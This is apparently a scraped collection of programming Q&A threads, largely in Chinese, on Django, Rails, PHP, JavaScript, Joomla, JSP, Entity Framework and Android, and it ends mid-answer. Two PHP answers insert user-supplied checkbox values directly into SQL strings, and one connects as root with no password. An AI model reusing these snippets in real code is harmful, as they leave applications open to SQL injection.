The [documentation](https://docs.djangoproject.com/en/1.4/ref/contrib/admin/#hooking-adminsite-instances-into-your-urlconf) shows this.

The error that you're getting is coming straight from the `re` python module, complaining about this part of a url:

```
?P[ 
```

The URLs you've posted in your comment beneath show this:

```
url(r'^(?P[-a-zA-Z0-9]+)/?$', 'myapp.views.getPost') 
```

Try changing that url by giving the match group a name:

```
url(r'^(?P<slug>[-a-zA-Z0-9]+)/?$', 'myapp.views.getPost') 
```

And in your `getPost` view, include a `slug` argument.

# javascript - 将检索到的数据从索引数据库存储到变量

> ID：14039177
> 
> 赞同：1
> 
> 时间：2012-12-26T10:21:12.683
> 
> 标签：javascript, jquery, synchronization, indexeddb

我正在使用以下代码从索引数据库中读取数据并将其保存在变量 allDownloadContent

```
ereaderdownload.indexedDB.getAllTodoItems = function() {

    /*var todos = document.getElementById("todoItems");
    todos.innerHTML = "";
  */
    var db = ereaderdownload.indexedDB.db;
    var trans = db.transaction(["downloadcontent"], "readwrite");
    var store = trans.objectStore("downloadcontent");
    var request = store.get(0);

    request.onsuccess = function(e) {
        console.log(e.target.result);
    };

    // Get everything in the store;
    var cursorRequest = store.openCursor();
    cursorRequest.onsuccess = function(e) {
        var result = e.target.result;
        if(!!result == false)
            return;
        allDownloadContent.push(result);
        result.continue();
    };
    alert("content "+allDownloadContent[0]);
    cursorRequest.onerror = ereaderdownload.indexedDB.onerror;
  }; 
```

当我从另一个 Javascript 文件调用 getAllTodoItems 方法时，我收到一条警报消息**内容未定义**

由于**cursorRequest.onsuccess**方法执行异步我得到未定义。

我无法使用网络工作者，因为 chrome 不支持它。

我在 Jquery 中尝试过承诺。我仍然收到相同的警报消息。

请帮助我解决问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T14:52:08.590

至于现在所有的浏览器都只支持Indexed-db ASync API，你需要做的就是给事务`oncomplete`事件添加一个事件监听器。此事件将在光标关闭时触发。从那里您可以返回您的代码：

```
trans.oncomplete = function (event) {
    console.log('transaction completed');
    yourFunction();
}; 
```

# ruby-on-rails-3 - 如何在传递查询字符串的 routes.rb 中进行重定向

> ID：14039181
> 
> 赞同：16
> 
> 时间：2012-12-26T10:21:35.060
> 
> 标签：ruby-on-rails-3, redirect, routes

我的 routes.rb 中有一个正常的重定向，就像这样；

```
match "/invoices" => redirect("/dashboard") 
```

我现在想为此添加一个查询字符串，例如，

```
/invoices?show=overdue 
```

将被重定向到

```
/dashboard?show=overdue 
```

我已经尝试了几件事。我得到的最接近的是；

```
match "/invoices?:string" => redirect("/dashboard?%{string}") 
```

这给了我正确的输出，但原始 URL 仍显示在浏览器中。

我确定我错过了一些非常简单的东西，但我看不出是什么。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-26T11:27:01.543

在这种情况下，您可以使用请求对象：

```
match "/invoices" => redirect{ |p, request| "/dashboard?#{request.query_string}" } 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2016-06-23T00:39:26.890

最简单的方法（至少在 Rails 4 中）是使用选项模式进行重定向调用..

```
get '/invoices' => redirect(path: '/dashboard') 
```

这只会更改路径组件并单独保留查询参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-01T10:02:14.463

虽然接受的答案非常有效，但它不太适合保持 DRY ——一旦你需要重定向多个路由，就会有很多重复的代码。

在这种情况下，自定义重定向器是一种优雅的方法：

```
class QueryRedirector
  def call(params, request)
    uri = URI.parse(request.original_url)
    if uri.query
      "#{@destination}?#{uri.query}"
    else
      @destination
    end
  end

  def initialize(destination)
    @destination = destination
  end
end 
```

现在您可以为该`redirect`方法提供此类的新实例：

```
get "/invoices", to: redirect(QueryRedirector.new("/dashboard")) 
```

我写[了一篇文章](https://relativkreativ.at/articles/how-to-preserve-the-query-string-when-redirecting-routes-in-a-rails-application)，有更详细的解释。

# django - @login_required 在 Django 中没有按预期工作？

> ID：14039184
> 
> 赞同：0
> 
> 时间：2012-12-26T10:21:40.847
> 
> 标签：django, login

我觉得`@login_required`非常有用。我`@login_required(login_url='/login/')`在每个视图之前都使用过这个。如果用户尝试访问`/upload`url，它会重定向到 url：`http://127.0.0.1:8000/login/?next=/upload_file/`我的 url 非常简单：

```
urlpatterns = patterns('',

    #url(r'^admin/', include(admin.site.urls)),
    url(r'^upload_file/', 'fileupload.views.upload_file'),
    url(r'^show_file/', 'fileupload.views.show_list'),
    url(r'^sync/', 'fileupload.views.sync'),
    url(r'^login/', 'fileupload.views.login_user'),
    url(r'^upload_file_form', 'fileupload.views.upload_file_form' )
) 
```

现在，当用户按下登录时，页面被重定向到无处。我确定我的网址格式不正确。我错过了什么？谢谢

**编辑**：

```
def login_user(request):
    errors = []
    state = "LOG IN"
    username = password = ''
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(username='username', password='password')
        if user is not None:
            if user.is_active:
                login(request, user)
                state = "You're successfully logged in!"
            else:
                state = "Your account is not active, please contact the site admin."
        else:
            state = "Your username and/or password were incorrect."

    return render_to_response('login.html', {'state':state, 'username': username}, context_instance=RequestContext(request)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:24:14.190

您的`fileupload.views.login_user`视图需要尊重`next`查询字符串参数本身。这是 Django 登录视图的内置功能，但由于您已经推出了自己的功能，因此您需要自己实现该功能。

# php - 使用 php 和 mysql 将多个复选框值存储到数据库

> ID：14039190
> 
> 赞同：0
> 
> 时间：2012-12-26T10:22:13.250
> 
> 标签：php, mysql, checkbox

我想存储多个复选框值以存储在单个字段中。我使用该链接[http://www.mindfiresolutions.com/Storing-array-data-to-MySQL-using-PHP-1296.php](http://www.mindfiresolutions.com/Storing-array-data-to-MySQL-using-PHP-1296.php)。但我没有得到结果。帮助找到那个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:28:14.910

将您的列设置为“设置”（指定所有可能的值。）数据类型，然后运行以下查询。

```
$comma_separated = implode(",", $values);
$insert_query = "INSERT INTO TABLE_NAME(col_name) VALUES('$comma_separated')";
$result_insert = mysql_query($insert_query); 
```

我希望这能解决你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-03T09:56:37.447

我希望这会有所帮助

```
<html>
<body>
<form action="" method="post">
<p><input type="checkbox" name="color[]" value="red" />Red</p>
<p><input type="checkbox" name="color[]" value="blue" />Blue</p>
<p><input type="checkbox" name="color[]" value="orange" />orange</p>
<input type="submit" value="submit" name="sub" />
</form>

<?php

if(isset($_POST['sub']))
{
    mysql_connect("localhost","root","") or die("Server Could not be connected");
    mysql_select_db("gobinath") or die("database connection problam");
    $color=implode(',',$_POST['color']);

    mysql_query("insert into mcheck values('','$color')") or die("insert problam");

}
?>
</body>
</html> 
```

# categories - 魔术数字。Joomla K2。错误的某些类别链接

> ID：14039197
> 
> 赞同：-1
> 
> 时间：2012-12-26T10:22:46.077
> 
> 标签：categories

我有一个类别（游戏）和子类别（游戏名称）。

[http://www.gamerno1.net/index.php?option=com_k2&view=itemlist&layout=category&task=category&id=1&Itemid=113](http://www.gamerno1.net/index.php?option=com_k2&view=itemlist&layout=category&task=category&id=1&Itemid=113)

所有类别的设置都是一样的。但是，某些子类别的链接会返回到父类别（游戏）。一旦我更改别名 - 一切正常。以下是子类别及其别名的列表。

```
 Ancients of Ooga    91810
Anomaly Warzone Earth   91200
Cloning Clyde   91800
Dead Island 91310
Demolition, Inc.    98600
Dungeon Defenders   65800
Dungeons of Dredmor 98800
E.Y.E: Divine Cybermancy    91700
Hard Reset  98400
Jamestown   94200
Post Apocalyptic Mayhem 91900
Ravaged 96300
Revenge of the Titans   93200
Rise of Immortals   90530
Sanctum 91600
SkyDrift    91100
SpaceChem   92800
Spiral Knights  99900
The Elder Scrolls V: Skyrim 72850
Toy Soldiers    98300
Worms Ultimate Mayhem   70600
Xotic   92600 
```

我的问题是什么？谢谢！

更新。

如果您创建具有别名的类别：91810、91200、91800 等。.. 类别将引用父类别。

为什么？

神奇的数字...

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-12-26T20:37:30.727

我解决了这个问题。

我删除了

```
urlencode($item->alias) 
```

到处

并且所有人都获得了权利。

感谢收看！！！

# jquery - Kendo UI Mobile Button data-click 触发两次

> ID：14039199
> 
> 赞同：0
> 
> 时间：2012-12-26T10:22:52.863
> 
> 标签：jquery, html, cordova, button, kendo-ui

我一直在测试我之前制作的一个简单（HTML5/jQuery）应用程序，其中用户在文本框中输入消息，当单击按钮时，此消息被视为警报。问题是每次我单击该按钮时， data-click 属性似乎会触发两次，因为消息会被警告两次。

我目前正在使用 Kendo UI 版本 2012.3.1114 和 jQuery 1.8.2 **我也尝试使用 jQuery 1.8.3 并得到相同的结果，但是当使用旧版本的 Kendo 时一切正常

有人可以帮帮我吗？！！！

更新：这是我的代码**顺便说一句，我正在使用涟漪模拟器来测试这个应用程序，甚至在 iPad 上进行了尝试，结果相同

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script src="js/jquery.min.js"></script>
    <script src="js/kendo.all.min.js"></script>
    <link href="styles/kendo.common.min.css" rel="stylesheet" />
    <link href="styles/kendo.default.min.css" rel="stylesheet" />   
    <link href="styles/kendo.mobile.all.min.css" rel="stylesheet" />
</head>
<body>
<div data-role="view" id="mainView">
    <br/>
    <center><a data-role="button" data-click="showAlert">Click Me</a></center>
    <br/>
</div>
<script>
    function showAlert(){
        alert("Clicked!!!");
    }
</script>
<script>
    var app = new kendo.mobile.Application(document.body);
</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-10-16T15:58:52.390

在使用 Kendo UI for MVC 时，我也发生了同样的事情。在 Kendo UI 按钮定义中，我有：

```
 @(Html.Kendo().Button().Name("showFirstGraphButton")
 .Tag("button")
 .Content("Submit Selection")
 .HtmlAttributes(new { id = "showFirstGraphButton" })
 .Events(ev => ev.Click("showFirstGraphButtonOnClick"))) 
```

在我编写的事件处理函数中。

```
function showFirstGraphButtonOnClick(e) {
e.preventDefault();
e.event.preventDefault(); 
.....  
} 
```

它对我有用，我确实验证了表单，然后如果每次验证都通过了，就使用 jquery 提交它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-03T10:04:13.420

我刚刚创建了一个简单的移动页面。添加一个文本框和按钮。在按钮上单击对文本框内容发出警报。我没有收到两次警报。看看下面的代码：

```
<!DOCTYPE html>
<html>
<head>
    <title>Events</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" >
    <script src="../../../js/jquery.min.js"></script>
    <script src="../../../js/kendo.mobile.min.js"></script>
    <script src="../../content/shared/js/console.js"></script>
    <link href="../../../styles/kendo.common.min.css" rel="stylesheet" />
    <link href="../../../styles/kendo.mobile.all.min.css" rel="stylesheet" />
</head>
<body>
    <a href="../index.html">Back</a>
    <div data-role="view" id="button-events" data-title="Button Events">
        <input id="txtMessage" style="display: block; margin: 2em; text-align: center;width:280px"/>
        <a id="mobile-button3" data-click="showAlert" data-role="button" style="display: block; margin: 2em; text-align: center;">Show Alert</a>
    </div>
    <script>
        function showAlert(e) 
        {
            alert($("#txtMessage").val())
        }
    </script>
    <script>
        window.kendoMobileApplication = new kendo.mobile.Application(document.body);
    </script>
</body>
</html> 
```

你能粘贴你的代码吗？这样我们就可以调试了吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-27T14:14:33.143

我意识到这是一个老问题，但只是为了在有人来找答案时得到答案。我遇到了同样的问题，在我的函数中返回 false 为我解决了这个问题。

# joomla - 是否有一个易于使用的表单来发送带有 joomla 附件的电子邮件？

> ID：14039201
> 
> 赞同：1
> 
> 时间：2012-12-26T10:23:01.783
> 
> 标签：joomla

我正在尝试为 joomla 网站构建一个自定义表单，该表单允许用户填写一些字段并附加一个文档，该文档将发送到我可以指定的电子邮件地址。

有谁知道任何好的组件或插件来完成这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-27T05:57:09.340

$from：这是电子邮件看起来像是来自的电子邮件地址。

$fromname：这是此电子邮件来自的个人或组织的名称。

$recipient：这是电子邮件将要发送到的电子邮件地址（或电子邮件地址数组）。

$subject：这是电子邮件的主题。

$body: 是邮件的正文。

$mode：为 HTML 电子邮件设置为 1，为文本电子邮件设置为 0。此字段是可选的。

$cc：这是电子邮件将被 Carbon 复制到的电子邮件地址（或电子邮件地址数组）。此字段是可选的。

$bcc：这是电子邮件将被 Blind Carbon 复制到的电子邮件地址（或电子邮件地址数组）。此字段是可选的。

$attachment：这是您希望附加到电子邮件的文件的完整路径和文件名（或完整路径和文件名的数组）。此字段是可选的。

$replyto：如果收件人单击回复，这是电子邮件将转到的电子邮件地址。此字段是可选的。

$replytoname：如果收件人单击回复，这是此电子邮件将发送至的个人或组织的名称。此字段是可选的。

现在您知道它是如何工作的，让我们看一个例子！

```
$from = 'admin@somewhere.com';
$fromname = 'BIGSHOT Blog';
$recipient[] = 'john@somewhere.com';
$recipient[] = 'jane@somewhere.com';
$subject = 'Want to learn about BIGSHOT Blog';
$body = '<p>Check us out!</p><p><a href="http://www.somewhere.com" target="_blank">http://www.somewhere.com</a></p>';
$mode = 1;
$cc = 'bob@somewhereelse.com';
$bcc[] = 'simon@somewhereelse.com';
$bcc[] = 'nick@somewhereelse.com';
$attachment[] = '/home/my_site/public_html/images/stories/food/coffee.jpg';
$attachment[] = '/home/my_site/public_html/images/stories/food/milk.jpg';
$replyto = 'no_reply@somewhere.com';
$replytoname = 'NO REPLY - BIGSHOT Blog';

JUtility::sendMail($from, $fromname, $recipient, $subject, $body, $mode, $cc, $bcc, $attachment, $replyto, $replytoname); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T10:38:42.847

您可以使用`JUtility::sendMail`在 Joomla 中发送带有附件的电子邮件。有关如何使用的更多信息，请访问此链接。

[JUtility/sendMail](http://docs.joomla.org/JUtility/sendMail)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:24:39.600

对 joomla 扩展目录进行更多挖掘，我想我找到了我需要的东西： http: [//extensions.joomla.org/extensions/contacts-and-feedback/contact-forms/11494](http://extensions.joomla.org/extensions/contacts-and-feedback/contact-forms/11494)

# c# - VS.NET 2010 web 项目中二进制引用信息保存在哪些文件中？

> ID：14039203
> 
> 赞同：2
> 
> 时间：2012-12-26T10:23:08.167
> 
> 标签：c#, asp.net, visual-studio-2010, web-project

我有一个供应商帮助使用 VS.NET 2010 开发一个 Web 项目。我从源代码控制系统获得了交付的源代码并尝试构建它。有一条错误消息显示一个命名空间未知，这是由于缺少 .dll 的引用。

但是，供应商确实将该引用添加到 Web 项目中，并在他自己的开发环境中成功构建了它。我知道对于类库项目，这些参考信息保存在 .csproj 文件中。文件系统 Web 项目呢？我在 .sln 或 Web 应用程序文件夹中都没有看到此信息。有谁知道它在哪里？我每次都需要手动添加引用，这没有任何意义。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T01:11:19.903

检查 system.web/assemblies 元素中的 web.config 文件

# ruby-on-rails - 在 Rails 中使用 parameter[:user_id] ,params[:user_id], params["userid"]？

> ID：14039205
> 
> 赞同：1
> 
> 时间：2012-12-26T10:23:18.057
> 
> 标签：ruby-on-rails, ruby

在研究 Rails 应用程序时，我看到如下语句：

```
parameter[:user_id]
params[:user_id]
params["userid"] 
```

谁能告诉我它们之间是否有任何重大区别？或者，都是只获取参数，我可以互换使用它们吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:42:12.383

```
parameter[:user_id] 
```

我不认为这是官方的。但是`parameters`，当前请求对象上有一个方法。参见`request.parameters`控制器动作。

```
params[:user_id] 
```

使用`params[:user_id]`与调用 相同`request.parameters[:user_id]`。也`params[:user_id]`一样`params["user_id"]`。请参阅[HashWithIndifferentAccess](http://api.rubyonrails.org/classes/ActiveSupport/HashWithIndifferentAccess.html)。

我不确定这是否只是您的拼写错误，但`params[:user_id]`并不`params["userid"]`相同，即使使用`HashWithIndifferentAccess`. `_`不会只是消失，因此它们可以保持不同的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:35:40.957

`params`并且`parameters`是相同的。它们在单个哈希中返回`GET`和参数。`POST`

没有这样的事情`parameter`。

参考：[rails api](http://guides.rubyonrails.org/action_controller_overview.html#parameters)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:42:28.043

不，您需要查看每个使用的上下文。`params`是可用于控制器中的方法的普通参数散列。它包含作为请求的一部分传入的参数 as`GET`或`POST`params。

因此，给定以下 URL：

```
http://www.testsite.org/some_resource?user_id=13 
```

将`params[:user_id]`包含值`13`。

如果 URL 改为：

```
http://www.testsite.org/some_resource?userid=13 
```

您需要使用`params[:userid]`来获取价值。因此，这一切都归结为为不同控制器制作 URL 的方式。

还有第三种方法，您可以将部分 URL 本身映射到应用程序中的路由参数。在您的应用程序中查看`config/routes.rb`。例如以下路线：

```
match '/user/:user_id' => 'users#show' 
```

你可以像这样传入一个 URL：

```
http://www.testsite.org/user/13 
```

在您的 UsersController.show 方法中，您可以`params[:user_id]`像往常一样使用访问用户 ID。

`parameter`哈希很可能是辅助方法或其他东西中参数哈希的本地副本或引用。

# tomcat - 为什么我在 OPENSHIFT 上托管的应用程序中收到 ERR_TOO_MANY_REDIRECTS？

> ID：14039208
> 
> 赞同：1
> 
> 时间：2012-12-26T10:23:28.777
> 
> 标签：tomcat, openshift

我已经按照本文中的步骤操作：[http](http://middlewaremagic.com/jboss/?p=2241) ://middlewaremagic.com/jboss/?p=2241 ，一切正常（我已经成功上传了我的应用程序并且它正在运行）。几天后，当我访问它时，我开始使用任何浏览器（使用 HTTP 或 HTTPS）收到“ERR_TOO_MANY_REDIRECTS”错误。我已经停止了应用程序，但错误仍然存​​在（！），有人知道会发生什么吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:25:16.583

检查您的 .htaccess 是否未启用重定向。您还启用了任何类型的缓存吗？最后但并非最不重要的一点是，我会检查您数据库中的 url 链接，以确保其中存在正确的 url。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T17:15:47.490

具体来说，检查您是否已清除应用程序域的浏览器缓存。可能您的错误条件发送了一个可缓存的重定向并且您的浏览器正在记住它。发生在我身上几次。

# ruby-on-rails - 使用 params.merge 将对象的参数传递给 Rspec 测试

> ID：14039209
> 
> 赞同：0
> 
> 时间：2012-12-26T10:23:29.267
> 
> 标签：ruby-on-rails, testing, rspec, factory-bot

在我的 rspec 测试中，我使用 factorygirl 创建了一个对象，在我的创建控制器中，我需要参数才能创建一个对象。由于有很多参数和回形针的连接，我不想手动给它们。我的代码如下：

```
 it "should render correct JSON on success save" do
    @params = {}
    post(:create, @params.merge(:upload => FactoryGirl.create(:upload)))
    response.body.should == @upload.to_json
  end 
```

所以我的问题是初始化 :upload 的参数。我已经`@upload`在一开始就用 factorygirl 创建了对象`before`

我应该如何有效地解决这个问题？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:41:17.427

这`post`不是规范的一部分，它是在响应之前发生的状态变化，因此它应该放在一个`before`块中。

参数不需要是实例变量（在 RSpec 中有什么作用？），最好使用`let`.

```
context "When saving" do

 before do
   post(:create, params)
 end

 subject { response.body }

 context "That is successful" do
   let(:upload) { FactoryGirl.attributes_for(:upload) }
   let(:params){
     {:upload => upload }
   }
   it { should == upload.to_json }
 end

 context "That is not successful" do
   # do some failure stuff here
 end
end 
```

# c# - C# 的 LINQ 和 .NET Framework，哪一个依赖于另一个？

> ID：14039214
> 
> 赞同：2
> 
> 时间：2012-12-26T10:24:16.293
> 
> 标签：c#, .net, linq

我认为 C# 语言编译器是一个自包含的黑匣子，能够理解特定语法的文本并生成编译代码。另一方面，.NET 框架是一个庞大的库，其中包含部分由 C# 和部分由 C++ 编写的功能。所以 .NET 框架依赖于 C# 语言，而不是相反。

但我无法将其融入 LINQ 的工作方式。LINQ 查询是 C# 编译器可以理解的特定语法的文本。但是要通过自己的 LINQ 提供程序构建，我需要使用 IQueryable 和 IQueryProvider 等接口，这两个接口都在框架的 System.Linq 命名空间中定义。

这是否意味着 C# 语言提供的功能依赖于 .NET 框架的一部分？C# 语言是否了解 .NET 框架？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-26T10:39:09.753

.NET Framework 包含许多部分。其中最重要的一项是 CLR — 公共语言运行时。所有 .NET 语言都依赖它，包括 C#，因为它们产生的 IL 代码不能由机器处理器执行。相反，CLR 执行它。

还有基础类库 BCL，可用于每种 .NET 语言：C#、VB.NET、托管 C++、F#、IronRuby，应有尽有。我怀疑它是用 C# 编写的。它不依赖于这些语言的任何特性，因为类和 OOP 是在 CLR 中构建的。

所以，是的，C# 语言了解 .NET 框架，它绝对*必须*了解它。想一想`IEnumerable`：要编译`foreach`成`GetEnumerator()`和`MoveNext()`调用，C# 编译器必须知道，嗯，`IEnumerable`存在。而且有些特别。

或者考虑属性！`Attribute`C# 编译器具有关于接口提供什么方法​​的内在知识。

但是CLR本身对C#一无所知。完全没有。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-26T10:38:50.887

> LINQ 查询是 C# 编译器可以理解的特定语法的文本。

好吧，*查询表达式*是 - 但编译器并没有真正“理解”它们。它只是以一种非常机械的方式翻译它们。例如，采取以下查询：

```
var query = from foo in bar
            where foo.X > 10
            select foo.Y; 
```

也就是翻译成：

```
var query = bar.Where(foo => foo.X > 10)
               .Select(foo => foo.Y); 
```

编译器对这里的内容和含义*一无所知。*它们甚至不必是方法——如果你有适当的字段或委托类型的属性，编译器就可以了。基本上，如果第二种形式可以编译，那么查询表达式也可以。`Where``Select`

大多数 LINQ 提供程序使用*扩展方法*来提供这些方法（`Where`、`Select`等`SelectMany`）。同样，它们只是 C# 语言的一部分——编译器不知道也不关心扩展方法的*作用*。

有关如何翻译查询表达式的更多详细信息，请参阅[我的 Edulinq 博客系列的第 41 部分](https://msmvps.com/blogs/jon_skeet/archive/2011/01/28/reimplementing-linq-to-objects-part-41-how-query-expressions-work.aspx)。您可能会发现我的 Edulinq 系列的其余部分也提供了丰富的信息 - 它基本上是一系列博客文章，我在其中重新实现了 LINQ to Objects，一次一个方法。同样，这表明 C# 编译器不依赖`System.Linq`命名空间中的 LINQ 实现或类似的东西。

# java - 如何在 jsp 中获取上下文参数值？

> ID：14039220
> 
> 赞同：12
> 
> 时间：2012-12-26T10:24:52.477
> 
> 标签：java, jsp

```
 <context-param>
        <param-name>productSearchRPP</param-name>
        <param-value>8</param-value>
    </context-param> 
```

我想在 products.jsp 页面中获取 productSearchRPP 的值

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-26T10:27:44.940

```
pageContext.getServletContext().getInitParameter("key"); 
```

这就是您在 JSP 中获取上下文参数值的方式。在 JSTL 中你可以像这样得到它

```
${pageContext.servletContext} 
```

或者

```
${applicationScope.attributeName} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-06-12T10:43:07.700

```
${initParam['productSearchRPP']} 
```

或者，进入 scriptlet

```
<%= pageContext.getServletContext().getInitParameter("productSearchRPP") %> 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-12-26T10:31:19.653

即使你可以在你的jsp中尝试这个。

```
ServletContext context = pageContext.getServletContext();
com = context.getInitParameter("com"); 
```

和 jstl 你可以使用。

```
${initParam['theStringIWant']} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-26T10:29:20.710

尝试这个：

```
application.getInitParameter("productSearchRPP") 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-26T10:30:11.740

```
 application.getServletContext().getInitParameter("productSearchRPP"); 
```

使用它来获得所需的结果

# c# - 无法使用实体框架 (edmx) 写入数据库

> ID：14039221
> 
> 赞同：0
> 
> 时间：2012-12-26T10:24:56.750
> 
> 标签：c#, entity-framework, edmx

正如标题所说，我在写入本地数据库时遇到问题。我从中生成了一个 edmx 模型，我可以轻松地从中读取。

```
EDMXNS.TOWDataBasev1Entities db = new EDMXNS.TOWDataBasev1Entities();

var query = from p in db.Accounts select p;

foreach (EDMXNS.Accounts s in query)
    Console.WriteLine(s.AccountName); 
```

这很好用。但是，当我尝试写入数据库时​​，什么也没有发生。我没有收到任何错误、异常等。我认为，因为我可以从数据库中读取，所以这不是连接问题。

这是我编写的代码。

```
EDMXNS.TOWDataBasev1Entities db = new EDMXNS.TOWDataBasev1Entities();
EDMXNS.Accounts acc = new EDMXNS.Accounts();

acc.AccountID = 1;
acc.AccountName = "testuser";
acc.AccountPW = "testpw";
acc.PersonDataID = 0;

db.AddToAccounts(acc);
db.SaveChanges(); 
```

值得一提的是我的 Accounts.AccountID 具有身份/自动增量，但我尝试将其设置为下一个已知值，或者根本不设置它。

有谁知道什么可能导致这个问题？

编辑：我还尝试删除自定义名称空间，删除数据库的所有记录并将其全部重新导入。

删除自定义工具名称空间会导致以下错误：“TOWServer.Accounts.AccountName”和“TOWServer.Accounts.AccountName”之间的歧义

这并没有告诉我任何事情。

现在重新导入所有内容给了我一个例外：“无法加载指定的元数据资源”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:55:19.043

在使用 EF 添加记录时，我一直使用这种格式，请尝试以下格式：

```
using (MovieStoreEntities context = new MoveStoreEntities()) 
    { 
      try 
      { 

        context.Movies.AddObject(new Movie() { MovieID = 234,  
             Title = "Sleepless Nights in Seattle", Quantity = 10 }); 
        context.SaveChanges(); 
      } 
      catch(Exception ex)  
      { 
        Console.WriteLine(ex.InnerException.Message);  
      } 
    } 
```

# c# - 如何在从 C# 返回的托管 CPP 中捕获 XmlSerializer 对象？

> ID：14039232
> 
> 赞同：0
> 
> 时间：2012-12-26T10:26:08.140
> 
> 标签：c#, c++, dll, managed-c++

我有一个 C# DLL，其中一种方法返回 XmlSerializer 对象。

我在我的托管 CPP 程序中使用的这个 DLL。从 CPP 我正在调用返回 XmlSerializer 对象的 C# 方法。请让我知道如何在托管 CPP 中捕获此返回的 XmlSerializer 对象。

例如：C# 方法：

```
XmlSerializer xmlTables1 = bc.ReadTablesXml(string company, string language, string servername, string config); 
```

如何从托管 CPP 调用上述方法？以及如何在 CPP 中捕获返回的 XmlSerializer 对象？

# android-notifications - 对Android中的通知点击没有影响

> ID：14039235
> 
> 赞同：0
> 
> 时间：2012-12-26T10:26:24.520
> 
> 标签：android-notifications

我在我的应用程序中使用这样的本地通知。

```
 showNotification(this, "Title1", "Message One", 1);
    showNotification(this, "Title2", "Message Two", 2);
    showNotification(this, "Title3", "Message Three", 3);
    showNotification(this, "Title4", "Message Four", 4);

public static void showNotification(Context con, String title,
        String message, int id) {

    NotificationManager manager = (NotificationManager) con
            .getSystemService(Context.NOTIFICATION_SERVICE);

    Notification note = new Notification(R.drawable.ic_noti_logo,title, System.currentTimeMillis());

    Intent notificationIntent = new Intent(con,Result.class);
    notificationIntent.putExtra("Message", message);
    notificationIntent.putExtra("NotiId", id);

    notificationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP
            | Intent.FLAG_ACTIVITY_SINGLE_TOP);

    PendingIntent pi = PendingIntent.getActivity(con, 0,
            notificationIntent, PendingIntent.FLAG_ONE_SHOT);

    note.setLatestEventInfo(con, title, message, pi);

    note.defaults |= Notification.DEFAULT_ALL;
    note.flags |= Notification.FLAG_AUTO_CANCEL;
    manager.notify(id, note);
} 
```

在 Resut.java 中

```
 message = getIntent().getStringExtra("Message");
    notiId = getIntent().getIntExtra("NotiId", 0);

    showAlert(message,notiId);

private void showAlert(String msg, int id) {
    AlertDialog.Builder builder = new AlertDialog.Builder(this);
    builder.setMessage(msg).setCancelable(false)
            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                //  finish();
                    cancelNotification(Result.this,id);
                }
            });
    AlertDialog alert = builder.create();
    alert.show();
}

public static void cancelNotification(Context con, int id) {

    NotificationManager manager = (NotificationManager) con
            .getSystemService(Context.NOTIFICATION_SERVICE);
    manager.cancel(id);
} 
```

我的问题是，我在通知栏中收到 4 条通知消息，当我单击其中任何一条时，我正在重定向到`Result`Activity，但它仅在我第二次单击时出现，但没有任何效果。请帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T21:08:47.297

问题是这四个通知共享相同`PendingIntent`，因为它们引用了等效的 Intent（[Intent.filterEquals()](https://developer.android.com/reference/android/content/Intent.html#filterEquals%28android.content.Intent%29)的文档解释说，要被认为是不同的，Intent 必须在操作、数据、类、类型或类别方面有所不同——注意额外在确定 Intent 是否相等时特别不考虑）。此外，您使用`PendingIntent.FLAG_ONE_SHOT`的保证`PendingIntent`只能使用一次。

# c# - 如何获得 Windows 7 航空选择颜色？

> ID：14039243
> 
> 赞同：2
> 
> 时间：2012-12-26T10:26:51.273
> 
> 标签：c#, winforms, user-interface, drawing, aero

如何检索与当前 Aero 样式相关的系统颜色？我特别需要选择渐变中使用的颜色。`SystemColors`结构不包含所需的颜色。

![航空颜色](../Images/452563e1b75a9eac0a28a22026e5bac2.png)

**或者**：如何使用 WinAPI 在特定画布（图形对象）上绘制选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:22:57.837

好的，所以最初问题的答案是：无法确定我要求的具体颜色。它由操作系统提供的内部主题例程进行评估。

幸运的是，有一种方法可以让操作系统绘制一个主题控件，即所谓的部分。.NET 提供了两个用于绘制 UI 的类：

*   [System.Windows.Forms.VisualStyles](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.aspx)用于主题 UI 和

*   [System.Windows.Forms.ControlPaint](http://msdn.microsoft.com/en-us/library/system.windows.forms.controlpaint.aspx)用于非主题“Windows 经典”。

我要求的选择可能由以下代码绘制：

```
